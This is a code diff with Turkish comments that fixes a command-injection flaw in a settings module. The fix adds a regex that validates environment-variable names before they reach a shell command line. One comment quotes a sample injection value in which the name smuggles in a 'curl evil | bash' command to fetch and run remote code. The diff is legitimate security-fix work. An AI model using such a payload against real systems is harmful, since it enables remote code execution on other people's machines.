@@ -11,6 +11,7 @@ gibi commands/ PAKETİNE bağımlı olmayan modüller de sorunsuz import edebils
 from __future__ import annotations
 import json
 import os
+import re
 import shutil
 from typing import Any, Dict, TYPE_CHECKING
 
@@ -21,6 +22,14 @@ if TYPE_CHECKING:
     from .providers.base import CliProvider
 
 SETTINGS_JSON = os.path.join(CLAUDEOPS_DIR, "settings.json")
+
+# BYOK env-var İSİMLERİ (settings.json'ın byok[cli] alanındaki anahtarlar)
+# spawn.py'de `env {ADI}={shlex.quote(value)} ...` olarak shell komut satırına
+# gömülüyor — SADECE değer (`value`) quote'lanıyordu, İSİM hiç doğrulanmıyordu.
+# `{"FOO; curl evil | bash #": "1"}` gibi bir env_name göndermek komut
+# enjeksiyonu demekti (Antigravity SEC-02, en kritik bulgu). Gerçek env-var
+# isimleri zaten hep bu şekle uyar — kısıtlama hiçbir meşru kullanımı kırmaz.
+BYOK_ENV_NAME_RE = re.compile(r"^[A-Z_][A-Z0-9_]*$")
 
 DEFAULT_SETTINGS: Dict[str, Any] = {
     "theme": "system",       # "system" | "light" | "dark"
@@ -160,10 +169,16 @@ def save_settings(patch: Dict[str, Any]) -> Dict[str, Any]:
                     continue
                 target = dict(merged_byok.get(cli_name) or {})
                 for env_name, env_val in envs.items():
-                    if env_val:
-                        target[str(env_name)] = str(env_val)
-                    else:
-                        target.pop(str(env_name), None)
+                    env_name = str(env_name)
+                    if not env_val:
+                        target.pop(env_name, None)
+                        continue
+                    # Geçersiz bir isim (yukarıdaki BYOK_ENV_NAME_RE yorumuna
+                    # bkz.) sessizce ATLANIR — save_settings'in geri kalanı gibi
+                    # (bilinmeyen anahtar/tip toleransı) hata fırlatmak yerine.
+                    if not BYOK_ENV_NAME_RE.match(env_name):
+                        continue
+                    target[env_name] = str(env_val)
                 if target:
                     merged_byok[str(cli_name)] = target
                 else:
